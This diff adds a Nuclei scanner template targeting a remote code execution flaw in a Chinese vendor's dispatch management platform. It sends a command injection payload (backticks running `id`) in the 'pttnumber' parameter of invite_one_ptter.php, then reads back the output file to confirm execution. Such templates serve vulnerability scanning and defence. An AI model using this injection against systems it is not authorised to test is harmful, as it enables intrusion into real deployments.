@@ -1,0 +1,24 @@
+id: invite_one_ptter_rce
+info:
+  name: 福建科立讯通信有限公司指挥调度管理平台RCE
+  author: wayxz
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /api/client/ptt/invite_one_ptter.php?callee=all&caller=1&pttnumber=`id>1.txt`&force=1&timeout=1 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+
+      - |
+        GET  /api/client/ptt/1.txt HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2,"uid=")'
